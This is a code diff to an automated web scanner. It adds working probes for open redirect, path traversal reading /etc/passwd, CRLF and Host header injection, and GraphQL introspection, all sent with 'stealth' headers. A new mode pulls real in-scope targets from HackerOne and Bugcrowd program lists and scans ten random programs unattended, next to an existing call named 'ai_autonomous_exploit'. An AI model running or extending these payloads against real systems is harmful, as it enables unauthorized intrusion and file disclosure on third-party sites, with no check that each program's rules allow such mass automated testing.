@@ -342,6 +342,94 @@ TAKEOVER_FINGERPRINTS = [
     ("Unrecognized domain", "Helpjuice"), ("The specified bucket does not exist", "AWS S3"),
 ]
 
+def check_open_redirect(url):
+    try:
+        payloads = ["//evil.com", "https://evil.com", "/%09/evil.com", "https:evil.com"]
+        params = ["url", "redirect", "next", "return", "go", "redirect_uri"]
+        
+        parsed = urlparse(url)
+        for param in params:
+            for payload in payloads:
+                target = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={payload}"
+                r = requests.get(target, headers=get_stealth_headers(), timeout=5, allow_redirects=False, verify=False)
+                if r.status_code in [301, 302, 307, 308]:
+                    loc = r.headers.get("Location", "")
+                    if "evil.com" in loc:
+                        return {"type": "OPEN_REDIRECT", "url": target, "severity": "MEDIUM", "confidence": "HIGH",
+                                "detail": f"Redirects to {loc}"}
+    except Exception: pass
+    return None
+
+def check_lfi(url):
+    try:
+        payloads = ["../../../../etc/passwd", "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "file:///etc/passwd"]
+        params = ["file", "page", "doc", "view", "path"]
+        
+        parsed = urlparse(url)
+        for param in params:
+            for payload in payloads:
+                target = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={payload}"
+                r = requests.get(target, headers=get_stealth_headers(), timeout=5, verify=False)
+                if "root:x:0:0:" in r.text or "daemon:x:1:" in r.text:
+                    return {"type": "LOCAL_FILE_INCLUSION", "url": target, "severity": "CRITICAL", "confidence": "HIGH",
+                            "detail": "Successfully read /etc/passwd"}
+    except Exception: pass
+    return None
+
+def check_crlf(url):
+    try:
+        payloads = ["/%0D%0ASet-Cookie:crlf=injection", "?q=%0D%0ASet-Cookie:crlf=injection"]
+        for payload in payloads:
+            target = f"{url.rstrip('/')}{payload}"
+            r = requests.get(target, headers=get_stealth_headers(), timeout=5, allow_redirects=False, verify=False)
+            if "crlf" in r.cookies or r.headers.get("Set-Cookie", "").find("crlf=injection") != -1:
+                return {"type": "CRLF_INJECTION", "url": target, "severity": "MEDIUM", "confidence": "HIGH",
+                        "detail": "Injected Set-Cookie header via CRLF"}
+    except Exception: pass
+    return None
+
+def check_host_header(url):
+    try:
+        headers = get_stealth_headers()
+        headers["Host"] = "evil-host-header.com"
+        r = requests.get(url, headers=headers, timeout=5, allow_redirects=False, verify=False)
+        if r.status_code in [301, 302, 307, 308]:
+            loc = r.headers.get("Location", "")
+            if "evil-host-header.com" in loc:
+                return {"type": "HOST_HEADER_INJECTION", "url": url, "severity": "LOW", "confidence": "HIGH",
+                        "detail": f"Host header reflected in Location: {loc}"}
+    except Exception: pass
+    return None
+
+def check_graphql(url):
+    try:
+        # Check if GraphQL endpoint exists
+        endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/graphiql"]
+        base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
+        
+        query = {"query": "{ __schema { types { name } } }"}
+        for ep in endpoints:
+            target = f"{base}{ep}"
+            r = requests.post(target, headers=get_stealth_headers(), json=query, timeout=5, verify=False)
+            if r.status_code == 200 and "__schema" in r.text and "types" in r.text:
+                return {"type": "GRAPHQL_INTROSPECTION", "url": target, "severity": "MEDIUM", "confidence": "HIGH",
+                        "detail": "GraphQL Introspection is enabled (schema leak)"}
+    except Exception: pass
+    return None
+
+def check_security_headers(url):
+    try:
+        r = requests.get(url, headers=get_stealth_headers(), timeout=5, verify=False)
+        missing = []
+        if "Strict-Transport-Security" not in r.headers: missing.append("HSTS")
+        if "X-Frame-Options" not in r.headers and "frame-ancestors" not in r.headers.get("Content-Security-Policy", ""): missing.append("Clickjacking (XFO/CSP)")
+        
+        if missing:
+            return {"type": "MISSING_SECURITY_HEADERS", "url": url, "severity": "LOW", "confidence": "HIGH",
+                    "detail": f"Missing: {', '.join(missing)}"}
+    except Exception: pass
+    return None
+
 def check_cors(url):
     try:
         h1 = {**get_stealth_headers(), "Origin": "https://evil.com"}
@@ -632,6 +720,11 @@ def scan_target_fast(handle, urls):
             tasks.append(executor.submit(check_headless_spa, b))
             tasks.append(executor.submit(ai_autonomous_exploit, b))
 
+            tasks.append(executor.submit(check_crlf, b))
+            tasks.append(executor.submit(check_host_header, b))
+            tasks.append(executor.submit(check_graphql, b))
+            tasks.append(executor.submit(check_security_headers, b))
+
             for path in INTERESTING_PATHS:
                 tasks.append(executor.submit(check_sensitive_single, f"{b}{path}", b_status, b_len))
                 
@@ -654,6 +747,10 @@ def scan_target_fast(handle, urls):
                             tasks.append(executor.submit(check_idor_single, target, ep_len))
                 except Exception: pass
             
+            for u in urls:
+                tasks.append(executor.submit(check_open_redirect, u))
+                tasks.append(executor.submit(check_lfi, u))
+
         for future in as_completed(tasks):
             res = future.result()
             if res:
@@ -668,12 +765,69 @@ def scan_target_fast(handle, urls):
     log(f"Found {len(findings)} issues for {handle}")
     return findings
 
+def fetch_all_targets():
+    """Fetch targets dynamically from HackerOne and Bugcrowd via public repos"""
+    log("[*] Fetching dynamic targets from H1 and Bugcrowd...")
+    all_targets = {}
+    
+    # 1. HackerOne
+    try:
+        h1_url = "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/hackerone_data.json"
+        r = requests.get(h1_url, timeout=30)
+        h1_data = r.json()
+        for p in h1_data:
+            if not p.get("offers_bounties", False): continue
+            handle = p.get("handle")
+            urls = []
+            for t in p.get("targets", {}).get("in_scope", []):
+                asset = t.get("asset_identifier", "")
+                atype = t.get("asset_type", "").upper()
+                if atype in ("URL", "WILDCARD") and not asset.startswith("*"):
+                    clean = asset.strip().rstrip("/")
+                    if not clean.startswith("http"): clean = f"https://{clean}"
+                    urls.append(clean)
+            if urls:
+                all_targets[handle] = urls[:50] # Top 50 scope items
+    except Exception as e: log(f"[-] Failed to fetch H1 targets: {e}")
+        
+    # 2. Bugcrowd
+    try:
+        bc_url = "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/bugcrowd_data.json"
+        r = requests.get(bc_url, timeout=30)
+        bc_data = r.json()
+        for p in bc_data:
+            if not p.get("has_bounty", False): continue
+            handle = p.get("code")
+            urls = []
+            for t in p.get("targets", {}).get("in_scope", []):
+                asset = t.get("target", "")
+                if asset and " " not in asset and "." in asset and not asset.startswith("*"):
+                    clean = asset.strip().rstrip("/")
+                    if not clean.startswith("http"): clean = f"https://{clean}"
+                    urls.append(clean)
+            if urls:
+                all_targets[f"bugcrowd_{handle}"] = urls[:50]
+    except Exception as e: log(f"[-] Failed to fetch Bugcrowd targets: {e}")
+    
+    log(f"[+] Loaded {len(all_targets)} bug bounty programs paying bounties")
+    return all_targets
+
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("target", nargs="?", help="Specific target")
+    parser.add_argument("--dynamic", action="store_true", help="Dynamically fetch fresh targets")
     args = parser.parse_args()
 
-    targets = load_targets()
+    if args.dynamic:
+        targets = fetch_all_targets()
+        # Randomly select 10 programs to scan in this run to avoid infinite execution
+        import random
+        keys = random.sample(list(targets.keys()), min(10, len(targets)))
+        targets = {k: targets[k] for k in keys}
+        log(f"[*] Dynamically selected {len(targets)} random bounty programs for this cycle")
+    else:
+        targets = load_targets()
+        
     if args.target:
         if args.target not in targets:
             log("Target not found")
